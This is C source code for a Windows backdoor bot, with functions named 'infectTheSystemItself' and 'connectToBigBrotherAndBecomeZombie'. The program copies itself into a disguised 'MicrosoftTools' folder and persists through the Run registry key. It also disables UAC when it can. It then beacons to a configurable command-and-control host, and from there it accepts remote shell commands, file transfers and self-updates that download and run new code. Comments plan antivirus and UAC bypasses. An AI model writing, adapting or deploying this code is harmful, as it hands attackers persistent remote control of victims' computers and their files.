#include <stdio.h>
#include <windows.h>
#include <Lmcons.h>
#include "EA_Socket.h"
#include "process.h"

static void onlyRunCommand(char * cmd);
static void infectTheSystemItself(void);
static void connectToBigBrotherAndBecomeZombie(void);
static int process(int sckt, char * al);

int main()	// gcc --machine-windows
{
	WSADATA _wsdata;

	while (WSAStartup(MAKEWORD(2, 0), &_wsdata) != 0)
	{
		Sleep(500);
	}

	//TODO: ByPass AV
	//TODO: ByPass UAC

	infectTheSystemItself();
	connectToBigBrotherAndBecomeZombie();
	
	WSACleanup();

	return 0;
}

static void onlyRunCommand(char * cmd)
{
	STARTUPINFO siStartInfo;
	PROCESS_INFORMATION piProcInfo;

	ZeroMemory(&siStartInfo, sizeof(STARTUPINFO));
	ZeroMemory(&piProcInfo, sizeof(PROCESS_INFORMATION));

	siStartInfo.cb = sizeof(STARTUPINFO);

	if (CreateProcessA("C:\\Windows\\System32\\cmd.exe", cmd,
			NULL, NULL, TRUE,
			CREATE_NO_WINDOW, // CREATE_NO_WINDOW CREATE_NEW_CONSOLE
			NULL, NULL, &siStartInfo, &piProcInfo))
	{
		CloseHandle(piProcInfo.hProcess);
		CloseHandle(piProcInfo.hThread);
	}

	Sleep(500); //TODO: process tam açýlana kadar beklenmeli
}

static void infectTheSystemItself(void)
{
	HKEY hKey;
	LONG lnRes;
	DWORD dwAttr;
	char command[400 + 1];
	char targetPath[MAX_PATH + 1];
	char srcPathwithName[MAX_PATH + 1];
	char targetPathwithName[MAX_PATH + 1];
	char lastFolderName[60] = "MicrosoftTools";
	char progName[60] = "deneme.exe";

	GetModuleFileNameA(NULL, srcPathwithName, MAX_PATH);

	snprintf(targetPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\%s", getenv("USERNAME"), lastFolderName);

	dwAttr = GetFileAttributesA(targetPath);

	if (dwAttr != 0xffffffff && (dwAttr & FILE_ATTRIBUTE_DIRECTORY))
	{
		if (strncmp(srcPathwithName, targetPath, strlen(targetPath)) != 0)
		{
			exit(0);
		}
		return;
	}

	snprintf(command, 400, "/c mkdir %s", targetPath);
	onlyRunCommand(command);

	snprintf(targetPathwithName, 400, "%s\\%s", targetPath, progName);

	snprintf(command, 400, "/c copy %s %s", srcPathwithName, targetPathwithName);
	onlyRunCommand(command);

	lnRes = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);

	if(ERROR_SUCCESS == lnRes)
	{
		lnRes = RegSetValueExA(hKey, progName, 0, REG_SZ, (BYTE * )targetPathwithName, strlen(targetPathwithName));
	}

	RegCloseKey(hKey);

	lnRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", 0, KEY_WRITE, &hKey);
	// if the program is started without admin, lnRes will not be ERROR_SUCCESS.
	if(ERROR_SUCCESS == lnRes)
	{
		DWORD number = 0;
		lnRes = RegSetValueExA(hKey, "EnableLUA", 0, REG_DWORD, (BYTE * )&number, sizeof(DWORD));
	}

	RegCloseKey(hKey);

	snprintf(command, 400, "/c start %s", targetPathwithName);
	onlyRunCommand(command);

	exit(0);
}

static void connectToBigBrotherAndBecomeZombie(void)
{
	int sckt;
	char * al;
    FILE * fIpPort;
    int port = 5005;
    struct hostent * he;
	int de, check = 0, yes = 1;
	struct sockaddr_in veriler;
    struct in_addr ** addr_list;
    char host[] = "127.0.0.1";

	if ((fIpPort = fopen("dt", "r")) != NULL)
	{
		fscanf(fIpPort,"%s %d", host, &port);
		fclose(fIpPort);
	}

	while((he = gethostbyname(host)) == NULL)
	{
		Sleep(1000);
	}

	addr_list = (struct in_addr **)he->h_addr_list;

	while (1)
	{
		sckt = socket(AF_INET, SOCK_STREAM, 0);

		if (sckt != SOCKET_ERROR)
		{
			setsockopt(sckt, SOL_SOCKET, SO_REUSEADDR, (char * )&yes, sizeof(int));

			veriler.sin_family = AF_INET;
			veriler.sin_port = htons(port);
			veriler.sin_addr.s_addr = inet_addr(inet_ntoa(*addr_list[0]));
			memset(veriler.sin_zero, 0, 8);

			while (1)
			{
				if((check = connect(sckt, (struct  sockaddr *)&veriler, sizeof(veriler))) != SOCKET_ERROR)
				{
					break;
				}

				Sleep(500);
			}

			while(1)
			{
				if ((al = recverText(sckt)) == NULL)
				{
					break;
				}

				if ((de = process(sckt, al)) != 0)
				{
					break;
				}

				free(al);
			}

			closesocket(sckt);
		}

		Sleep(1000);
	}
}

static int process(int sckt, char * al)
{
	if (strncmp(al, "cmd", 3) == 0)
	{
		processCMD(sckt);
	}
	else if (strncmp(al, "getFile ", 8) == 0)
	{
		processFileUpload(sckt, al + 8);
	}
	else if (strncmp(al, "sendFile ", 9) == 0)
	{
		processFileDownload(sckt, al + 9);
	}
	else if (strncmp(al, "update ", 7) == 0)
	{
		char command[400 + 1];
		onlyRunCommand("/c rename *.exe old.exe");
		processFileDownload(sckt, al + 7);
		snprintf(command, 400, "/c start %s", al + 7);
		onlyRunCommand(command);
		exit(0);
	}
	else if (strncmp(al, "host port ", 10) == 0)
	{
		processIpPort(al + 10);
	}

	return 0;
}
